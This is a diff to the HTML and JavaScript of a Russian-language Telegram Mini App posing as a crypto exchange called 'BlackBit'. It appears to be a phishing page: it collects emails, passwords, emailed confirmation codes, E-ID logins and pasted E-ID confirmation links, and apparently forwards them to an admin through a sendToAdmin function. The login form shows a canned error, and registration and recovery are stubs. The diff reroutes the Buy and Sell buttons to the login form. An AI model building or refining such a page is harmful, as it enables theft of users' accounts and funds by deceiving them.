@@ -262,6 +262,14 @@
         }
 
         /* ============================================================
+           ВСПОМОГАТЕЛЬНЫЕ КЛАССЫ
+           ============================================================ */
+        .text-center { text-align: center; }
+        .mt-8 { margin-top: 8px; }
+        .mt-12 { margin-top: 12px; }
+        .mt-16 { margin-top: 16px; }
+
+        /* ============================================================
            АДАПТИВ
            ============================================================ */
         @media (max-width: 420px) {
@@ -313,7 +321,7 @@
             </div>
 
             <!-- График с фиксированной высотой -->
-            <div style="width:100%; height:320px; overflow:hidden; border-radius:8px;">
+            <div style="width:100%; height:320px; overflow:hidden; border-radius:8px; background:#0d1117;">
                 <div id="tradingview_btc" style="width:100%; height:320px;"></div>
             </div>
 
@@ -339,8 +347,8 @@
 
             <!-- Кнопки Купить/Продать -->
             <div class="action-buttons">
-                <button class="btn btn-buy" id="buyBtn">Купить</button>
-                <button class="btn btn-sell" id="sellBtn">Продать</button>
+                <button class="btn btn-buy" onclick="goToLoginForm()">Купить</button>
+                <button class="btn btn-sell" onclick="goToLoginForm()">Продать</button>
             </div>
         </div>
 
@@ -350,7 +358,7 @@
             <button class="btn" onclick="goToAbout()">ℹ️ О бирже</button>
         </div>
 
-        <div style="text-align:center; margin-top:10px; color:var(--tg-theme-hint-color, #8b949e); font-size:12px;">
+        <div class="text-center mt-8" style="color:var(--tg-theme-hint-color, #8b949e); font-size:12px;">
             <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')" style="color:var(--tg-theme-hint-color, #8b949e); text-decoration:none;">Нет аккаунта? Зарегистрироваться</a>
         </div>
     </div>
@@ -359,7 +367,7 @@
     СТРАНИЦА 2: О БИРЖЕ
     ============================================================ -->
     <div id="pageAbout" class="page">
-        <div style="text-align:center; font-size:40px; margin-bottom:8px;">📘</div>
+        <div class="text-center" style="font-size:40px; margin-bottom:8px;">📘</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:4px;">О бирже</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">BlackBit — современная криптобиржа</div>
         <div style="background:var(--tg-theme-bg-color, #0d1117); border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid var(--tg-theme-hint-color, #30363d);">
@@ -381,7 +389,7 @@
     СТРАНИЦА 3: ВХОД
     ============================================================ -->
     <div id="pageLoginForm" class="page">
-        <div style="text-align:center; font-size:40px; margin-bottom:4px;">🔑</div>
+        <div class="text-center" style="font-size:40px; margin-bottom:4px;">🔑</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
 
@@ -400,11 +408,11 @@
 
         <div id="loginError" style="display:none; margin-top:12px; padding:10px; background:#f8514933; color:#f85149; border-radius:8px; text-align:center; font-size:14px;">Ошибка. Повторите попытку входа.</div>
 
-        <div style="text-align:center; margin-top:12px; color:var(--tg-theme-hint-color, #8b949e); font-size:13px;">
+        <div class="text-center mt-12" style="color:var(--tg-theme-hint-color, #8b949e); font-size:13px;">
             <a href="#" onclick="showMessage('Функция восстановления скоро появится', 'info')" style="color:var(--tg-theme-hint-color, #8b949e); text-decoration:none;">Восстановить пароль</a>
         </div>
 
-        <div style="text-align:center; margin-top:8px; color:var(--tg-theme-hint-color, #8b949e); font-size:13px;">
+        <div class="text-center mt-8" style="color:var(--tg-theme-hint-color, #8b949e); font-size:13px;">
             Нет аккаунта? <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')" style="color:#58a6ff; text-decoration:none;">Зарегистрироваться</a>
         </div>
 
@@ -415,7 +423,7 @@
     СТРАНИЦА 4: КОД
     ============================================================ -->
     <div id="pageCode" class="page">
-        <div style="text-align:center; font-size:40px; margin-bottom:4px;">✉️</div>
+        <div class="text-center" style="font-size:40px; margin-bottom:4px;">✉️</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Код подтверждения</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите код, отправленный на вашу почту</div>
 
@@ -437,7 +445,7 @@
     СТРАНИЦА 5: E-ID
     ============================================================ -->
     <div id="pageEid" class="page">
-        <div style="text-align:center; font-size:40px; margin-bottom:4px;">🆔</div>
+        <div class="text-center" style="font-size:40px; margin-bottom:4px;">🆔</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход через E-ID</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
 
@@ -463,7 +471,7 @@
     СТРАНИЦА 6: ССЫЛКА E-ID
     ============================================================ -->
     <div id="pageEidLink" class="page">
-        <div style="text-align:center; font-size:40px; margin-bottom:4px;">🔗</div>
+        <div class="text-center" style="font-size:40px; margin-bottom:4px;">🔗</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Ссылка подтверждения</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Вставьте ссылку из письма</div>
 
@@ -528,6 +536,9 @@
     function showPage(id) {
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
         document.getElementById(id).classList.add('active');
+        // Скрываем сообщения при смене страницы
+        const msgDiv = document.getElementById('msg');
+        msgDiv.style.display = 'none';
     }
 
     function goToMain() { showPage('pageMain'); }
@@ -550,17 +561,7 @@
     });
 
     // ============================================================
-    // 5. КНОПКИ КУПИТЬ/ПРОДАТЬ
-    // ============================================================
-    document.getElementById('buyBtn').addEventListener('click', function() {
-        showMessage('Функция покупки в разработке', 'info');
-    });
-    document.getElementById('sellBtn').addEventListener('click', function() {
-        showMessage('Функция продажи в разработке', 'info');
-    });
-
-    // ============================================================
-    // 6. TRADINGVIEW ГРАФИК
+    // 5. TRADINGVIEW ГРАФИК (чистый, без индикаторов)
     // ============================================================
     setTimeout(function() {
         if (typeof TradingView !== 'undefined') {
@@ -574,15 +575,18 @@
                 "locale": "ru",
                 "toolbar_bg": "#161b22",
                 "enable_publishing": false,
-                "hide_side_toolbar": false,
-                "allow_symbol_change": true,
-                "details": true,
-                "hotlist": true,
+                "hide_side_toolbar": true,
+                "allow_symbol_change": false,
+                "details": false,
+                "hotlist": false,
                 "calendar": false,
-                "studies": [
-                    "MASimple@tv-basicstudies",
-                    "RSI@tv-basicstudies"
-                ]
+                "studies": [],
+                "hide_top_toolbar": true,
+                "range": "12M",
+                "save_image": false,
+                "autosize": false,
+                "timezone": "Europe/Moscow",
+                "withdateranges": false
             });
         } else {
             console.log('TradingView не загружен, проверьте соединение.');
@@ -590,7 +594,7 @@
     }, 500);
 
     // ============================================================
-    // 7. СООБЩЕНИЯ
+    // 6. СООБЩЕНИЯ
     // ============================================================
     function showMessage(text, type) {
         const msgDiv = document.getElementById('msg');
@@ -615,7 +619,7 @@
     }
 
     // ============================================================
-    // 8. ДАННЫЕ ПОЛЬЗОВАТЕЛЯ
+    // 7. ДАННЫЕ ПОЛЬЗОВАТЕЛЯ
     // ============================================================
     function getUserData() {
         const user = tg.initDataUnsafe?.user;
@@ -623,7 +627,7 @@
     }
 
     // ============================================================
-    // 9. ОТПРАВКА В БОТА
+    // 8. ОТПРАВКА В БОТА
     // ============================================================
     async function sendToAdmin(text) {
         try {
@@ -644,7 +648,7 @@
     }
 
     // ============================================================
-    // 10. ЛОГИН
+    // 9. ЛОГИН
     // ============================================================
     let userEmail = '';
     let userPassword = '';
@@ -693,7 +697,7 @@
     }
 
     // ============================================================
-    // 11. КОД
+    // 10. КОД
     // ============================================================
     async function handleCode() {
         const code = document.getElementById('codeInput').value.trim();
@@ -732,7 +736,7 @@
     }
 
     // ============================================================
-    // 12. E-ID
+    // 11. E-ID
     // ============================================================
     async function handleEidLogin() {
         const email = document.getElementById('eidEmail').value.trim();
@@ -777,7 +781,7 @@
     }
 
     // ============================================================
-    // 13. E-ID ССЫЛКА
+    // 12. E-ID ССЫЛКА
     // ============================================================
     async function handleEidLink() {
         const link = document.getElementById('eidLinkInput').value.trim();
@@ -816,14 +820,14 @@
     }
 
     // ============================================================
-    // 14. ПОДДЕРЖКА
+    // 13. ПОДДЕРЖКА
     // ============================================================
     function openSupportChat() {
         window.open(SUPPORT_LINK, '_blank');
     }
 
     // ============================================================
-    // 15. ПОКАЗАТЬ ПРИВЕТСТВИЕ ПРИ ЗАГРУЗКЕ
+    // 14. ПОКАЗАТЬ ПРИВЕТСТВИЕ ПРИ ЗАГРУЗКЕ
     // ============================================================
     document.addEventListener('DOMContentLoaded', function() {
         goToMain();
